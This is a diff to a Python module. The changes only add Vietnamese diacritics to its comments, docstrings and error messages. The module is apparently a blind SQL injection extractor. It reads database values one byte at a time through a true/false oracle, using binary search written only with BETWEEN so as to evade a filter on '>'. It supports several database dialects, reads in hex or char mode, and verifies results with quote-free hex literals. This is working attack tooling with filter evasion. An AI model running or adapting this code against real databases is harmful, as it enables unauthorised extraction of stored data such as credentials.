@@ -1,17 +1,17 @@
 #!/usr/bin/env python3
 """
-Extract - trich xuat gia tri chuoi qua oracle true/false, tong quat theo dialect.
+Extract - trích xuất giá trị chuỗi qua oracle true/false, tổng quát theo dialect.
 
-Bung logic tu draft/ (bsearch chi dung BETWEEN, get_number, che do hex/char) nhung
-KHONG hardcode cu phap MySQL. Cac manh cu phap (substr/ascii/length/hex/hexlit) lay tu
-`dialect` cua DBMS da chot -> chay duoc cho MySQL/PGSQL/MSSQL/Oracle.
+Bung logic từ draft/ (bsearch chỉ dùng BETWEEN, get_number, chế độ hex/char) nhưng
+KHÔNG hardcode cú pháp MySQL. Các mảnh cú pháp (substr/ascii/length/hex/hexlit) lấy từ
+`dialect` của DBMS đã chốt -> chạy được cho MySQL/PGSQL/MSSQL/Oracle.
 
-Che do:
-  - hex : doc hex(value), charset [0-9A-F], binary search bang BETWEEN. An toan nhat,
-          bat duoc byte >127 (multibyte). ~5 request/hex-digit.
-  - char: doc truc tiep tung ky tu, khoang 0..255. ~8 request/ky tu.
+Chế độ:
+  - hex : đọc hex(value), charset [0-9A-F], binary search bằng BETWEEN. An toàn nhất,
+          bắt được byte >127 (multibyte). ~5 request/hex-digit.
+  - char: đọc trực tiếp từng ký tự, khoảng 0..255. ~8 request/ký tự.
 
-(Che do turbo cua draft phu thuoc do-dai-sleep, de sau - can transport that de hieu chuan.)
+(Chế độ turbo của draft phụ thuộc độ-dài-sleep, để sau - cần transport thật để hiệu chuẩn.)
 """
 
 from __future__ import annotations
@@ -26,14 +26,14 @@ class ExtractError(Exception):
 
 
 class Dialect:
-    """Boc dict dialect, cung cap cac ham lap rap bieu thuc SQL."""
+    """Bọc dict dialect, cung cấp các hàm lắp ráp biểu thức SQL."""
 
     def __init__(self, d: dict):
         self.d = d
 
     def _need(self, key: str) -> str:
         if key not in self.d:
-            raise ExtractError("dialect thieu manh '%s'" % key)
+            raise ExtractError("dialect thiếu mảnh '%s'" % key)
         return self.d[key]
 
     def substr(self, src: str, i: int) -> str:
@@ -57,14 +57,14 @@ class Dialect:
     def notnull(self, src: str) -> str:
         return self.d.get("notnull", "(({s}) is not null)").format(s=src)
 
-    # bieu thuc "ma ky tu thu i cua src"
+    # biểu thức "mã ký tự thứ i của src"
     def char_code_at(self, src: str, i: int) -> str:
         return self.ascii(self.substr(src, i))
 
 
 # --------------------------------------------------------------------------- search
 def bsearch(oracle: Oracle, expr: str, lo: int, hi: int) -> int:
-    """Tim gia tri cua <expr> trong [lo,hi] CHI bang BETWEEN (ne filter '>')."""
+    """Tìm giá trị của <expr> trong [lo,hi] CHỈ bằng BETWEEN (né filter '>')."""
     while lo < hi:
         mid = (lo + hi) // 2
         if oracle.ask("%s between %d and %d" % (expr, lo, mid)):
@@ -75,11 +75,11 @@ def bsearch(oracle: Oracle, expr: str, lo: int, hi: int) -> int:
 
 
 def get_number(oracle: Oracle, expr: str, hi: int = 4096) -> int:
-    """Doc mot so nguyen, tu noi rong khoang tren neu can."""
+    """Đọc một số nguyên, tự nới rộng khoảng trên nếu cần."""
     while not oracle.ask("%s between 0 and %d" % (expr, hi)):
         hi *= 2
         if hi > 2 ** 24:
-            raise ExtractError("%s vuot qua 2^24 - co le subquery tra NULL" % expr)
+            raise ExtractError("%s vượt quá 2^24 - có lẽ subquery trả NULL" % expr)
     return bsearch(oracle, expr, 0, hi)
 
 
@@ -90,9 +90,9 @@ def extract(oracle: Oracle,
             mode: str = "hex",
             maxlen: Optional[int] = None,
             progress=None) -> tuple[bytes, dict]:
-    """Trich xuat gia tri cua <query>. Tra ve (raw_bytes, meta).
+    """Trích xuất giá trị của <query>. Trả về (raw_bytes, meta).
 
-    progress(done, total, preview) - callback tuy chon de hien tien do.
+    progress(done, total, preview) - callback tùy chọn để hiện tiến độ.
     """
     dia = Dialect(dialect)
     meta = {}
@@ -101,13 +101,13 @@ def extract(oracle: Oracle,
         if progress:
             progress(done, total, preview)
 
-    # 1) subquery co du lieu khong? NULL lam moi dieu kien thanh false am tham.
+    # 1) subquery có dữ liệu không? NULL làm mọi điều kiện thành false âm thầm.
     if not oracle.ask(dia.notnull(query)):
         raise ExtractError(
-            "subquery tra NULL hoac khong co row. Kiem tra ten bang/cot va quyen."
+            "subquery trả NULL hoặc không có row. Kiểm tra tên bảng/cột và quyền."
         )
 
-    # 2) do dai byte va ky tu -> phat hien multibyte
+    # 2) độ dài byte và ký tự -> phát hiện multibyte
     blen = get_number(oracle, dia.length(query))
     clen = get_number(oracle, dia.charlen(query))
     meta["byte_len"] = blen
@@ -144,11 +144,11 @@ def extract(oracle: Oracle,
             _progress(i, n, out.decode("utf-8", "replace"))
         return bytes(out), meta
 
-    raise ExtractError("mode khong ho tro: %s (dung 'hex' hoac 'char')" % mode)
+    raise ExtractError("mode không hỗ trợ: %s (dùng 'hex' hoặc 'char')" % mode)
 
 
 def verify(oracle: Oracle, query: str, dialect: dict, data: bytes) -> bool:
-    """Xac minh toan bo gia tri bang 1 request, dung hex literal (khong can nhay)."""
+    """Xác minh toàn bộ giá trị bằng 1 request, dùng hex literal (không cần nháy)."""
     dia = Dialect(dialect)
     lit = dia.hexlit(data.hex())
     return oracle.ask("(%s) between %s and %s" % (query, lit, lit))
